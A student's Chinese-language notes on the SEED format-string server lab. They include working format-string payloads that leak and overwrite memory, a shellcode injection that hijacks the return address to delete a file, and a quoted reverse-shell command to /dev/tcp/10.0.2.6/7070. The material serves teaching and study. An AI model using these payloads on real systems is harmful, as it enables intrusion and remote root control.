# Format_String_Server

## 知识点

1. ```c
   int sprintf(char *str, const char *format, ...)
   ```

   - **str** -- 这是指向一个字符数组的指针，该数组存储了 C 字符串。
   - **format** -- 这是字符串，包含了要被写入到字符串 str 的文本。它可以包含嵌入的 format 标签，format 标签可被随后的附加参数中指定的值替换，并按需求进行格式化。

2. **$( )**：是用来作命令替换的。命令替换与变量替换差不多，都是用来重组命令行的，先完成引号里的命令行，然后将其结果替换出来，再重组成新的命令行。

3. **%n**：不打印任何内容并将到目前为止已打印的字符数写入int变量，即记录%n之前的字符长度。  `printf("blah %n blah\n", &val);`

   "%n"修改4个字节，"%hn"修改两个字节。

4. **精度修饰符**：控制最少打印多少位字符，如果数字不够长则在前面补0。`printf(“%.5d”, 10)将打印00010`。

   **宽度修饰符**：没有小数点，也控制最少打印多少位字符，如果整数位小于指定宽度，则数字开头以空格填充。`printf(“%5d”, 10)将打印   10`。

5. 用户的输入的内容会被保存在栈中。P115

6. **asm**（C/C++内嵌汇编）：

7. `-Wformat=2`：编译命令，可以警告非常量字符串的格式化字符串字段，但程序进一步分析改字符串是否来自用户输入成本过高。

8. 几个不同printf函数的区别：

   | 参数类型 | 输出到设备 | 输出到文件 | 输出到字符串     |
   | -------- | ---------- | ---------- | ---------------- |
   | 可变参数 | printf     | fprintf    | sprint、snprintf |
   | 固定参数 | vprintf    |            |                  |

   ```c
   #include <stdio.h>
   int printf(const char *format, ...);
   int fprintf(FILE *stream, const char *format, ...);
   int sprintf(char *str, const char *format, ...);
   int snprintf(char *str, size_t size, const char *format, ...);
   
   #include <stdarg.h>
   int vprintf(const char *format, va_list ap);
   ```

   print系列函数根据 format 参数生成输出内容：

   - printf和vprintf函数：把输出内容写到stdout，即标准输出流；
   - fprintf函数：把输出内容写到指定的stream流；
   - sprintf函数：存入指定的数组str内，会自动在结尾追加null字节。此外，因为sprintf可能会溢出，所以调用者要确保str的尺寸；
   - snprintf函数：把输出内容存放到字符串str中，相对于sprintf明确指定了尺寸，防止溢出问题。

9. **socket编程**

10. **python的 -c** 可以在命令行中调用 python 代码, 实际上 -c 就是 command 的意思

    ```bash
    python -c 'print("AAAA"+"%08X."*100)' > badfile
    ```

    将print中的内容输入到badfile文件中。或者下面的代码也可以。

    ```bash
    echo $(printf "\x04\xF3\xFF\xBF")%.8x%.8x > badfile
    ```

    

11. 在用printf语句打印**%s**的时候，printf语句要求提供字符串首地址。这是printf所规定的，也就是看到%s，printf就要求指针变量，而不是我们逻辑上认为的指针里面所存储的内容。如果用%c，想输出里面的内容就可以按照正常的指针概念。

    ```c
    char p[10] = {}；
    printf("%s \n %p \n %c \n", p, p, *p);
    ```

12. **[question]**在用printf语句打印**%x**的时候，会打印出va_list指针指向的数，并且以16进制。打印出的是指向地址储存的值？



## 习题

## 实验

为了简化本实验中的任务，我们使用以下命令关闭地址随机化:

```bash
sudo sysctl -w kernel.randomize_va_space=0
```

### Task 1: The Vulnerable Program

> ​		给定一个具有格式字符串漏洞的易受攻击的程序server.c。这个程序是一个服务器程序。当它运行时，它监听UDP端口9090。每当UDP数据包到达这个端口，程序得到数据并调用myprintf()来打印数据。服务器是一个根守护进程，也就是说，它与根特权。在myprintf()函数内部，存在一个格式字符串漏洞。我们将利用这一点获取根权限的漏洞。
>
> ​		需要注意的是，程序需要使用“-z execstack”选项编译，该选项允许堆栈可执行。此选项对任务1到5没有影响，但对于任务6和7，它很重要。在这两个任务中，我们需要将恶意代码注入这个服务器程序的堆栈空间；如果堆栈不可执行，任务6和7将失败。非可执行堆栈是针对基于堆栈的代码注入攻击的一种对策，但可以使用返回libc技术来击败它。为了简化这个实验室，我们只需禁用这个可击败的对策。
>
> ​		运行和测试服务器。该实验室的理想设置是在一个VM上运行服务器，然后从另一个VM发起攻击。但是，如果学生在本实验室使用一个虚拟机是可以接受的。在服务器虚拟机上，我们使用root权限运行服务器程序。我们假设这个程序是一个特权根守护进程。服务器侦听端口9090。在客户机VM上，我们可以使用nc命令将数据发送到服务器，其中标志**“-u”表示UDP**（服务器程序是UDP服务器）。以下示例中的IP地址应替换为服务器VM的实际IP地址，或者如果客户端和服务器在同一个VM上运行IP地址为127.0.0.1。
>
> ```bash
> // On the server VM
> sudo ./server
> 
> // On the client VM: send a "hello" message to the server
> echo hello | nc -u 10.0.2.5 9090
> 
> // On the client VM: send the content of badfile to the server
> nc -u 10.0.2.5 9090 < badfile
> ```
>
> ​		你可以向服务器发送任何数据。服务器程序应该打印出您发送的任何内容。但是，服务器程序的myprintf() 函数中存在一个格式字符串漏洞，它允许我们让服务器程序执行比它应该执行的更多的操作，包括向我们提供对服务器机器的根访问权限。在本实验室的其余部分中，我们将利用此漏洞。

编译程序，收到了一条警告消息。此警告消息是 gcc编译器针对格式字符串漏洞实现的对策。我们现在可以忽略这个警告消息。

![image-20211012162440523](D:\git_repository\computer_security\学习笔记\6 Format_String_Server.assets\image-20211012162440523.png)

尝试从客户端向服务器发送消息，字符串和二进制文件均成功

![image-20211012164322440](D:\git_repository\computer_security\学习笔记\6 Format_String_Server.assets\image-20211012164322440.png)



### Task 2: Understanding the Layout of the Stack

> 为了在本实验中取得成功，在myprintf() 中调用printf() 函数时，必须了解堆栈布局。图1描述了堆栈布局。你需要进行一些调查和计算。我们故意在服务器代码中打印一些信息，以帮助简化调查。根据调查，学生应回答以下问题：
>
> - 问题1：用①、②和③标记的位置的内存地址是什么
> - 问题2：用①和③标记的位置之间的距离是多少？
>
> ![image-20211012170653896](D:\git_repository\computer_security\学习笔记\6 Format_String_Server.assets\image-20211012170653896.png)
>
> ————————从myprintf() 函数内部调用printf() 时的堆栈布局————————

先输入四个AAAA查看一下输入在buf数组中的位置：

```bash
 python -c 'print("AAAA"+"%08X."*100)' > badfile
 nc -u 10.0.2.5 9000 < badfile
```

![image-20211012182909423](D:\git_repository\computer_security\学习笔记\6 Format_String_Server.assets\image-20211012182909423.png)

==0xbfe088b4 ---- 00000000==
0xbfe088b8 ---- 000000A0
0xbfe088bc ---- B770E978
0xbfe088c0 ---- FFFFFFFF
0xbfe088c4 ---- 00000000
0xbfe088c8 ---- B7549608
==0xbfe088cc ---- BFE08A70==
0xbfe088d0 ---- B76F3000
0xbfe088d4 ---- B770E978
0xbfe088d8 ---- BFE08988
0xbfe088dc ---- 00000000
0xbfe088e0 ---- 00000000
0xbfe088e4 ---- 00000000
0xbfe088e8 ---- 00000000
0xbfe088ec ---- 00000000
0xbfe088f0 ---- 00000000
0xbfe088f4 ---- 00000000
0xbfe088f8 ---- 00000000
0xbfe088fc ---- 00000000
0xbfe08900 ---- 00000000
0xbfe08904 ---- 00000000
0xbfe08908 ---- 00000000
0xbfe0890c ---- 00000000
0xbfe08910 ---- 00000000
0xbfe08914 ---- 00000000
0xbfe08918 ---- 00000000
0xbfe0891c ---- 00000000
0xbfe08920 ---- 00000000
0xbfe08924 ---- 00000000
0xbfe08928 ---- 00000000
0xbfe0892c ---- 00000000
0xbfe08930 ---- 00000000
0xbfe08934 ---- 00000000
0xbfe08938 ---- 00000000
0xbfe0893c ---- 00000000
0xbfe08940 ---- 00000000
0xbfe08944 ---- 00000000
0xbfe08948 ---- 00000000
0xbfe0894c ---- 00000000
0xbfe08950 ---- 00000000
0xbfe08954 ---- 00000000
0xbfe08958 ---- 00000000
0xbfe0895c ---- 00000000
0xbfe08960 ---- 00000000
0xbfe08964 ---- 00000000
0xbfe08968 ---- 00000000
0xbfe0896c ---- 00000000
0xbfe08970 ---- 00000000
0xbfe08974 ---- 00000000
0xbfe08978 ---- 00000000
0xbfe0897c ---- DEC34400
0xbfe08980 ---- 00000003
0xbfe08984 ---- BFE08A70
0xbfe08988 ---- BFE09058
==0xbfe0898c ---- 080487FA==
==0xbfe08990 ---- BFE08A70==
0xbfe08994 ---- BFE089A8
0xbfe08998 ---- 00000010
0xbfe0899c ---- 08048719
0xbfe089a0 ---- B770EBF0
0xbfe089a4 ---- B770E958
0xbfe089a8 ---- 00000010
0xbfe089ac ---- 00000003
0xbfe089b0 ---- 28230002
0xbfe089b4 ---- 00000000
0xbfe089b8 ---- 00000000
0xbfe089bc ---- 00000000
0xbfe089c0 ---- D8C80002
0xbfe089c4 ---- 0402000A
0xbfe089c8 ---- 00000000
0xbfe089cc ---- 00000000
0xbfe089d0 ---- 00000000
0xbfe089d4 ---- 00000000
0xbfe089d8 ---- 00000000
0xbfe089dc ---- 00000000
0xbfe089e0 ---- 00000000
0xbfe089e4 ---- 00000000
0xbfe089e8 ---- 00000000
0xbfe089ec ---- 00000000
0xbfe089f0 ---- 00000000
0xbfe089f4 ---- 00000000
0xbfe089f8 ---- 00000000
0xbfe089fc ---- 00000000
0xbfe08a00 ---- 00000000
0xbfe08a04 ---- 00000000
0xbfe08a08 ---- 00000000
0xbfe08a0c ---- 00000000
0xbfe08a10 ---- 00000000
0xbfe08a14 ---- 00000000
0xbfe08a18 ---- 00000000
0xbfe08a1c ---- 00000000
0xbfe08a20 ---- 00000000
0xbfe08a24 ---- 00000000
0xbfe08a28 ---- 00000000
0xbfe08a2c ---- 00000000
0xbfe08a30 ---- 00000000
0xbfe08a34 ---- 00000000
0xbfe08a38 ---- 00000000
0xbfe08a3c ---- 00000000
0xbfe08a40 ---- 00000000
0xbfe08a44 ---- 00000000
0xbfe08a48 ---- 00000000
0xbfe08a4c ---- 00000000
0xbfe08a50 ---- 00000000
0xbfe08a54 ---- 00000000
0xbfe08a58 ---- 00000000
0xbfe08a5c ---- 00000000
0xbfe08a60 ---- 00000000
0xbfe08a64 ---- 00000000
0xbfe08a68 ---- 00000000
0xbfe08a6c ---- 00000000
==0xbfe08a70 ---- 41414141==

- ①**[question]**是格式化字符串的地址，由图中可知，指向了buf的地址，从这一点看，地址应为**0xbfe088cc**；但格式化字符串在printf() 函数的va_list指针开始前的一个位置，而打印的地址正是从头开始的，所以从这一点来看，地址应为**0xbfe088b0**；如何从程序直接获取到呢？
- ②是myprintf() 函数的返回地址，程序中输出的“The ebp value inside myprintf()”为ebp的值，而返回地址的值即ebp+4，为**0xbfe0898c**；同时由图中可知，msg指向了buf的地址，看地址输出知msg的地址为0xbfe08990，减去4为0xbfe0898c，与程序输出的值相符；
- ③是buf数组的起始位置，即程序中输出的input array，由程序输出知，地址为**0xbfe08a70**；由打印出的地址也可以判断，储存“AAAA”的地方为buf的起始地址，与程序输出一致。
- ①与③之间的距离为 0xbfe08a70 - 0xbfe088b0 = 448

### Task 3: Crash the Program

> 此任务的目标是向服务器提供输入，这样当服务器程序试图在myprintf（）函数中打印用户输入时，它将崩溃。

**[question]**在输入中放一些"%s"即可，"%s"需要获取一个地址值，并将其值的字符串打印出来，当一个程序试图从一个非法地址获取数据时，该程序将崩溃，而va_list指针开始移动后便进入了myprintf函数的栈帧中，其中的地址有很多是非法地址。

![image-20211012190817163](D:\git_repository\computer_security\学习笔记\6 Format_String_Server.assets\image-20211012190817163.png)

![image-20211012190754474](D:\git_repository\computer_security\学习笔记\6 Format_String_Server.assets\image-20211012190754474.png)

### Task 4: Print Out the Server Program’s Memory

> ​		此任务的目标是让服务器从内存中打印出一些数据。数据将在服务器端打印出来，因此攻击者无法看到它。因此，这不是一种有意义的攻击，但此任务中使用的技术对于后续任务至关重要。
>
> - 任务4.A：堆栈数据。目标是打印堆栈上的数据（任何数据都可以）。您需要提供多少格式说明符才能让服务器程序通过%x打印出输入的前四个字节？
>
> - 任务4.B：堆数据堆区域中存储有一条秘密消息，您知道它的地址；你的工作是打印出秘密信息的内容。为了实现这一目标，您需要将秘密消息的地址（以二进制形式）放入您的输入（即格式字符串），但在终端中键入二进制数据是很困难的。我们可以使用以下命令来实现这一点。
>
>   ```bash
>   echo $(printf "\x04\xF3\xFF\xBF")%.8x%.8x | nc -u 10.0.2.5 9090
>   // Or we can save the data in a file
>   echo $(printf "\x04\xF3\xFF\xBF")%.8x%.8x > badfile
>   nc -u 10.0.2.5 9090 < badfile
>   ```
>
>   应该注意的是，大多数计算机都是小端机器，因此要在内存中存储地址0xAABBCCDD（32位机器上的四个字节），最低有效字节0xDD存储在较低的地址中，而最高有效字节0xAA存储在较高的地址中。因此，当我们将地址存储在缓冲区中时，我们需要使用以下顺序保存地址：0xDD、0xCC、0xBB，然后是0xAA。
>
> Python代码。因为我们需要构造的格式字符串可能相当长，所以编写Python程序来进行构造更加方便。下面的示例代码显示如何构造包含二进制数的字符串。
>
> ```python
> #!/usr/bin/python3
> import sys
> 
> # Initialize the content array
> N = 1500
> content = bytearray(0x0 for i in range(N))
> 
> # This line shows how to store an integer at offset 0
> number  = 0xbfffeeee
> content[0:4]  =  (number).to_bytes(4,byteorder=’little’)
> 
> # This line shows how to store a 4-byte string at offset 4
> content[4:8]  =  ("abcd").encode(’latin-1’)
> 
> # This line shows how to construct a string s with
> #  12 of "%.8x", concatenated with a "%s"
> s = "%.8x"*12 + "%s"
> 
> # The line shows how to store the string s at offset 8
> fmt  = (s).encode(’latin-1’)
> content[8:8+len(fmt)] = fmt
> 
> # Write the content to badfile
> 
> file = open("badfile", "wb")
> file.write(content)
> file.close()
> ```

**任务A**，打印输入的前四个字节，只需借助前面得到的格式化字符串和buf之间的距离便可以算出，需要多少个格式说明符。448 / 4 = 112

![image-20211012194213438](D:\git_repository\computer_security\学习笔记\6 Format_String_Server.assets\image-20211012194213438.png)

![image-20211012194145492](D:\git_repository\computer_security\学习笔记\6 Format_String_Server.assets\image-20211012194145492.png)



**任务B**，首先由程序输出可知，秘密的地址为0x08048880，使用二进制输入至buf，然后按照偏移值使用"%s"获取输入的值（$可以设置偏移值，连续用112个"%s"会使程序崩溃，可以先用111个"%x"）

```bash
python -c 'print("\x80\x88\x04\x08" + "%112$s")' > badfile
python -c 'print("\x80\x88\x04\x08" + "%08x"*111 + "%s")' > badfile
```

![image-20211012195534560](D:\git_repository\computer_security\学习笔记\6 Format_String_Server.assets\image-20211012195534560.png)

![image-20211012200003174](D:\git_repository\computer_security\学习笔记\6 Format_String_Server.assets\image-20211012200003174.png)

### Task 5: Change the Server Program’s Memory

> 此任务的目标是修改服务器程序中定义的目标变量的值。其原始值为0x11223344。假设此变量包含一个重要值，该值会影响程序的控制流。如果远程攻击者可以更改其值，则可以更改此程序的行为。我们有三个子任务：
>
> - 任务5.A：将该值更改为其他值。在这个子任务中，我们需要将目标变量的内容更改为其他内容。如果你能把任务转换成不同的值，不管它是什么值，你的任务就算是成功了。
> - 任务5.B：将该值更改为0x500。在此子任务中，我们需要将目标变量的内容更改为特定值0x500。只有当变量的值变为0x500时，你的的任务才被视为成功。
> - 任务5.C：将该值更改为0xFF990000。此子任务与上一个类似，只是目标值现在是一个大数字。在格式字符串攻击中，此值是printf() 函数打印出的字符总数；打印出这么多字符可能需要几个小时。你需要使用更快的方法。基本思想是使用%hn而不是%n，因此我们可以修改两个字节的内存空间，而不是四个字节。打印出216个字符不需要很多时间。我们可以将目标变量的内存空间分成两个内存块，每个内存块有两个字节。我们只需要将一个块设置为0xFF99，将另一个块设置为0x0000。这意味着在攻击中，您需要在格式字符串中提供两个地址。
>
> 在格式化字符串攻击中，将内存空间的内容更改为非常小的值是非常具有挑战性的（请在报告中解释原因）；0x00是一种极端情况。为了实现这一目标，我们需要使用溢出技术。基本思想是，当我们使一个数字大于存储允许的值时，只会存储该数字的较低部分（基本上，存在整数溢出）。例如，如果数字$2^{16}+5$存储在16位存储器空间中，则仅存储5。因此，要得到零，我们只需要得到$2^{16} = 65536$的数字。

首先根据程序输出的结果可以知道，当前target的值为0x11223344，target的地址为0x0804a044。

**任务A + 任务B**，修改内存中的数据关键是printf() 函数中的"%n"格式规定符，这个格式规定符会把目前已打印出的字符个数写入内存，当然需要提供被写入的地址。

```BASH
python -c 'print("\x44\xa0\x04\x08" + "i"*1276 + "%112$n")' > badfile
python -c 'print("\x44\xa0\x04\x08" + "%1276x" + "%112$n")' > badfile
```

![image-20211012202327133](D:\git_repository\computer_security\学习笔记\6 Format_String_Server.assets\image-20211012202327133.png)

 **任务C**，为加快效率，将4个字节的数分成两部分修改，此时用到的格式规定符为"hn"。所以两部分的地址分别为0x0804a044和0x0804a046，要分别修改为0x0000和0xFF99。而直接不打印输出0x0000是难以做到的，通过提示，使用**溢出**的办法。

**[question]**16进制数是高位地址大吗？参数位置是固定112、113的。

```bash
python -c 'print("\x46\xa0\x04\x08\x44\xa0\x04\x08" + "%65425x" + "%112$hn" + "%103x" + "%113$hn")' > badfile
python -c 'print("\x44\xa0\x04\x08\x46\xa0\x04\x08" + "%65528x" + "%112$hn" + "%65433x" + "%113$hn")' > badfile
```

![image-20211012205108535](D:\git_repository\computer_security\学习笔记\6 Format_String_Server.assets\image-20211012205108535.png)

### Task 6: Inject Malicious Code into the Server Program

> ​		现在我们准备好追击这次袭击的王冠上的宝石，i.e向服务器程序注入一段恶意代码，这样我们就可以从服务器上删除一个文件。这项任务将为我们的下一项任务奠定基础，即完全控制服务器计算机。
>
> ​		要执行此任务，我们需要将一段二进制格式的恶意代码注入服务器内存，然后使用格式字符串漏洞修改函数的返回地址字段，因此当函数返回时，它会跳转到我们注入的代码。要删除文件，我们希望恶意代码使用shell程序（如`/bin/bash`）执行`/bin/rm`命令。这种类型的代码称为shellcode。
>
> ```bash
> /bin/bash -c "/bin/rm /tmp/myfile"
> ```
>
> ​		我们需要使用execve() 系统调用执行上面的外壳代码命令，这意味着向execve() 提供以下参数：
>
> ```c
> execve(address to the "/bin/bash" string, address to argv[], 0),
> 	where argv[0] = address of the "/bin/bash" string,
> 		  argv[1] = address of the "-c" string,
>    		  argv[2] = address of the "/bin/rm /tmp/myfile" string,
> 		  argv[3] = 0
> ```
>
> ​		我们需要编写机器代码来调用execve() 系统调用，这涉及到在调用`int 0x80`指令之前设置以下四个寄存器：
>
> ```c
> eax = 0x0B (execve()’s system call number)
> ebx = address of the "/bin/bash" string (argument 1)
> ecx = address of argv[] (argument 2)
> edx = 0 (argument 3, for environment variables; we set it to NULL)
> ```
>
> ​		在shellcode中设置这四个寄存器非常具有挑战性，主要是因为代码中不能有任何零（字符串中的零终止字符串）。我们在下面提供shellcode。有关外壳代码的详细说明，请参见缓冲区溢出实验seed book（第二版）的第4.7章。
>
> 
>
> ```python
> # The following code runs "/bin/bash -c '/bin/rm /tmp/myfile' "
> 
> malicious_code= (
> 	# Push the command '/bin////bash' into stack (//// is equivalent to /)
> 	"\x31\xc0"  # xorl %eax,%eax
> 	"\x50"  # pushl %eax
> 	"\x68""bash"  # pushl "bash"
> 	"\x68""////"  # pushl "////"
> 	"\x68""/bin"  # pushl "/bin"
> 	"\x89\xe3"  # movl %esp, %ebx
>     
>        # Push the 1st argument ’-ccc’ into stack (-ccc is equivalent to -c)
>     	"\x31\xc0"  # xorl %eax,%eax
>     	"\x50"  # pushl %eax
>     	"\x68""-ccc"  # pushl "-ccc"
>     	"\x89\xe0"  # movl %esp, %eax
> 
>     	# Push the 2nd argument into the stack:
>     	#  ’/bin/rm /tmp/myfile’
>     	# Students need to use their own VM’s IP address
>     	"\x31\xd2"  # xorl %edx,%edx
>     	"\x52"  # pushl %edx
>     	"\x68""  "  # pushl (an integer) 
>     	"\x68""ile "  # pushl (an integer) ①
>     	"\x68""/myf"  # pushl (an integer)
>     	"\x68""/tmp"  # pushl (an integer)
>     	"\x68""/rm "  # pushl (an integer)
>     	"\x68""/bin"  # pushl (an integer) ②
>     	"\x89\xe2"  # movl %esp,%edx
> 
>     	# Construct the argv[] array and set ecx
>     	"\x31\xc9"  # xorl %ecx,%ecx
>     	"\x51"  # pushl %ecx
>     	"\x52"  # pushl %edx
>     	"\x50"  # pushl %eax
>     	"\x53"  # pushl %ebx
>     	"\x89\xe1"  # movl %esp,%ecx
> 
>     	# Set edx to 0
>     	"\x31\xd2"  #xorl %edx,%edx
> 
>     	# Invoke the system call
>     	"\x31\xc0"  # xorl %eax,%eax
>     	"\xb0\x0b"  # movb $0x0b,%al
>     	"\xcd\x80"  # int $0x80
> ).encode(’latin-1’)
> ```
> ​		您需要注意行①和②之间的代码。这就是我们将`/bin/rm`命令字符串推入堆栈的地方。在此任务中，您不需要修改此部分，但对于下一个任务，您确实需要修改它。`pushl`指令只能将32位整数推入堆栈；这就是为什么我们把字符串分成几个4字节的块。由于这是一个shell命令，添加额外的空格不会改变命令的含义；因此，如果字符串的长度不能除以四，则始终可以添加额外的空格。堆栈从高地址增长到低地址（即反向），因此我们需要将字符串也反向推入堆栈。
>
> ​		在shellcode中，当我们将`/bin/bash`存储到堆栈中时，我们存储`/bin///bash`，它的长度为12，是4的倍数。execve() 会忽略附加的`/`。类似地，当我们将`-c`存储到堆栈中时，我们存储`-ccc`，将长度增加到4。对于bash，这些额外的`c`被认为是冗余的。
>
> ​		请构造您的输入，将其提供给服务器程序，并演示您可以成功删除目标文件。在实验室报告中，您需要解释格式字符串是如何构造的。请在图1中标出恶意代码的存储位置（请提供具体地址）。

**方法一：**

首先使用python生成恶意代码，存入badfile中。

下面要考虑如何将恶意代码注入，比较直接的方法就是修改myprintf的返回地址，首先由程序输出可知当前myprintf的返回地址为0xbfffeff8 + 4 = 0xbfffeffc 。 

![image-20211013175120752](D:\git_repository\computer_security\学习笔记\6 Format_String_Server.assets\image-20211013175120752.png)

然后恶意代码的地址就是buf数组开始地址0xbffff0e0加上前面的地址8个字节输入再加上500个字节nop。因为加了nop所以跳转的地址不用太准确，只要跳到nop上就会执行到恶意代码，这里就选了buf数组起始后的40个字节的位置即0xbffff108。

```bash
python -c 'print("\xfe\xef\xff\xbf" + "@@@@" + "\xfc\xef\xff\xbf" + "%49139x" + "%112\$hn" + "%12553x" + "%113\$hn"+ "\x90"*500 + "\x31\xc0\x50\x68bash\x68////\x68/bin\x89\xe3\x31\xc0\x50\x68-ccc\x89\xe0\x31\xd2\x52\x68    \x68ile \x68/myf\x68/tmp\x68/rm \x68/bin\x89\xe2\x31\xc9\x51\x52\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80")' > badfile
```

python -c 'print("\xfe\xef\xff\xbf" + "@@@@" + "\xfc\xef\xff\xbf"+ "%49139x" + "%112\$hn" + "%12553x" + "%113\$hn"  + "%08X."*200)' > badfile

### Task 7: Getting a Reverse Shell

> ​		当攻击者能够向受害者的机器注入命令时，他们对在受害者机器上运行一个简单的命令不感兴趣；他们对运行许多命令更感兴趣。攻击者想要实现的是利用攻击建立一个后门，这样他们就可以利用这个后门方便地进行进一步的破坏。
>
> ​		设置后门的一种典型方法是从受害机器运行Reverse shell，让攻击者能够访问受害机器。Reverse shell是一个在远程计算机上运行的shell进程，连接回攻击者的计算机。这为攻击者提供了一种方便的方法，一旦远程计算机受到威胁，就可以访问它。种子书（第二版）第9章提供了关于反向外壳如何工作的解释。它也可以在Shellshock攻击实验室和TCP攻击实验室的指南部分找到。
>
> ​		要获得反向shell，我们需要首先在攻击者机器上运行TCP服务器。此服务器等待我们的恶意代码从受害者服务器计算机回调。以下nc命令创建侦听端口7070的TCP服务器：
>
> ```bash
> nc -l 7070 -v
> ```
>
> ​		您需要修改清单3中列出的shellcode，因此外壳代码不会使用bash运行`/bin/rm`命令，而是运行以下命令。该示例假定攻击者的计算机IP地址为10.0.2.6，因此您需要更改代码中的IP地址：
>
> ```bash
> /bin/bash -c "/bin/bash -i > /dev/tcp/10.0.2.6/7070 0<&1 2>&1"
> ```
>
> ​		您只需要修改行①和②之间的代码，因此上面的`/bin/bash-i…`命令由shellcode执行，而不是`/bin/rm`命令。完成外壳代码后，应该构造格式字符串，并将其作为输入发送到受害者服务器。如果您的攻击成功，您的TCP服务器将获得回调，并且您将在受害者计算机上获得root shell。请在报告中提供成功的证据（包括截图）。







### Task 8: Fixing the Problem

> ​		还记得gcc编译器生成的警告消息吗？请解释一下它的意思。请修复服务器程序中的漏洞，然后重新编译。编译器警告消失了吗？你的攻击仍然有效吗？您只需尝试一次攻击，即可查看它是否仍然有效。
